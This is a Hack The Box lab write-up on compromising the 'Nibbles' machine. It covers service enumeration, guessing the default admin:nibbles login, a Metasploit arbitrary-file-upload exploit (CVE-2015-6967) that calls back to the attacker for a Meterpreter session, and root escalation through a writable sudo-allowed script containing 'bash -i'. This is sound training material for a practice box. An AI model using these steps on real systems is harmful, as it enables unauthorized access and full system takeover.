<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Z4B0-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Web_Security-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-CWES(Hack_The_Box)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-In_Progress-16a34a?style=flat-square" />

</div>

## Nibbles — Hack The Box Write-Up

<div align="left">

![Category: Web](https://img.shields.io/badge/Category-Web-red)<br>
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>

This machine focuses on **classic CMS exploitation and privilege escalation**, highlighting how weak credentials and unsafe sudo configurations can lead to full system compromise.

- CMS enumeration & version disclosure
- Arbitrary file upload exploitation (CVE-2015-6967)
- Reverse shell & post-exploitation
- Abusing writable sudo-allowed scripts

---

## 🛠 Tools

```
nmap              → discovering open ports & services
feroxbuster       → directory & file enumeration
searchsploit      → public exploit discovery
metasploit        → CMS exploitation
sudo              → privilege escalation enumeration
```

---

## 🔍 Reconnaissance & Enumeration

As with any penetration test, we begin with **Reconnaissance and Enumeration**.

### Full Port Scan

````bash
sudo nmap  10.10.10.75 -sV -Pn


**Results:**

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
````

![image](images/nibles.png)

---

### Service Enumeration

```bash
sudo nmap -p 22,80 -sC -sV 10.10.10.75 -vv -T4
```

- **SSH:** OpenSSH 7.2p2 (Ubuntu)
- **HTTP:** Apache 2.4.18 (Ubuntu)

---

## 🌐 Web Enumeration

Browsing port **80** displays a minimal page:

```text
Hello world!
```

![image](images/nibles1.png)

Viewing the page source reveals a directory reference:

```text
/nibbleblog/
```

![image](images/nibles2.png)

---

## 🎯 Nibbleblog Discovery

Visiting `/nibbleblog/` reveals a blog installation powered by **Nibbleblog**:

![image](images/nibles3.png)

---

## 🔎 Vulnerability Research

```bash
searchsploit Nibbleblog
```

![image](images/nibles4.png)

Relevant finding:

```text
Nibbleblog 4.0.3 - Arbitrary File Upload
```

---

## 📂 Directory Enumeration

```bash
feroxbuster \
  --url http://10.10.10.75/nibbleblog/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -C 404
```

**Interesting paths:**

- `/admin`
- `/content`
- `/plugins`
- `/themes`
- `/languages`
- `/README`

![image](images/nibles5.png)

---

## 📄 Version Disclosure

The `README` file confirms:

```text
Nibbleblog version: 4.0.3
```

Vulnerable to **CVE-2015-6967**.

---

## 🔐 Authentication Enumeration

Inspecting exposed configuration files reveals a username:

```text
admin
```

![image](images/nibles7.png)

Manual password testing succeeds:

```text
admin : nibbles
```

---

## 💥 Exploitation — Arbitrary File Upload

Using Metasploit:

```bash
use exploit/multi/http/nibbleblog_file_upload
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog/
set RHOSTS 10.10.10.75
set LHOST tun0
run
```

A Meterpreter session is obtained.

---

## 🐚 Shell Upgrade

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

User context:

```text
nibbler@Nibbles
```

![image](images/nibles8.png)

---

## 🧑 User Flag

```bash
cat /home/nibbler/user.txt
```

---

## 👑 Privilege Escalation

```bash
sudo -l
```

![image](images/nibles9.png)

Allowed command:

```text
/home/nibbler/personal/stuff/monitor.sh
```

The path is writable.

### Exploit Creation

```bash
mkdir -p ~/personal/stuff
nano ~/personal/stuff/monitor.sh
```

```bash
#!/bin/bash
bash -i
```

```bash
chmod +x monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

![image](images/nibles10.png)

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```

![image](images/nibles11.png)

---

## 🧠 What This Box Teaches

- CMS documentation and source files often leak attack paths
- Arbitrary file uploads are still highly impactful
- Weak credentials remain a common entry point
- Misconfigured sudo rules can instantly lead to root

---

## 📌 Conclusion

Nibbles is a classic **enumeration-driven machine** that rewards careful inspection over brute force.
Chaining **CVE-2015-6967** with a writable sudo-allowed script results in full system compromise.

> _If a script can be executed as root — assume it can be abused._

This work is part of **FuzzRaiders’ structured hands-on training and research program**, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor, and real-world security execution

Happy hacking 🚀

# Author: Z4B0 [LinkedIn](https://www.linkedin.com/in/mahamud-abdirahman-151493375/)
